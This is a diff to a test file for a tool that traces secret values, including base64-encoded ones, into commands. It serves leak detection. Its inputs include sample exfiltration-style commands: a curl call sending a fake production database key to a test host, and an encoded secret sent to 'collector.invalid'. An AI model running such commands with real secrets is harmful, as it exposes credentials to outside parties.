@@ -20,7 +20,9 @@ def test_value_quoted_inside_sql():
     assert trace(call, [ENV_PROD]) == [Origin(token=KEY, step=4, how="exact")]
 
 
-@pytest.mark.parametrize("separator", ["=", ":", "&"], ids=["equals", "colon", "amp"])
+@pytest.mark.parametrize(
+    "separator", ["=", ":", "&", "@"], ids=["equals", "colon", "amp", "at"]
+)
 def test_value_after_a_separator_inside_one_token(separator):
     call = f"curl -H token{separator}FAKE-DB-PROD-KEY-0000 https://x.example.test"
     assert trace(call, [ENV_PROD]) == [Origin(token=KEY, step=4, how="exact")]
@@ -49,6 +51,18 @@ def test_upper_cased_value():
 def test_base64_encoded_value():
     encoded = base64.b64encode(VALUE.encode()).decode()
     assert trace(f"upload {encoded}", [(2, VALUE)]) == [
+        Origin(token=encoded, step=2, how="base64")
+    ]
+
+
+@pytest.mark.parametrize(
+    "value",
+    [VALUE[:-1], VALUE, VALUE + "0"],
+    ids=["20-bytes-one-pad", "21-bytes-no-pad", "22-bytes-two-pads"],
+)
+def test_base64_value_glued_to_a_domain_is_traced_whatever_its_padding(value):
+    encoded = base64.b64encode(value.encode()).decode()
+    assert trace(f"send {encoded}@collector.invalid", [(2, value)]) == [
         Origin(token=encoded, step=2, how="base64")
     ]
 
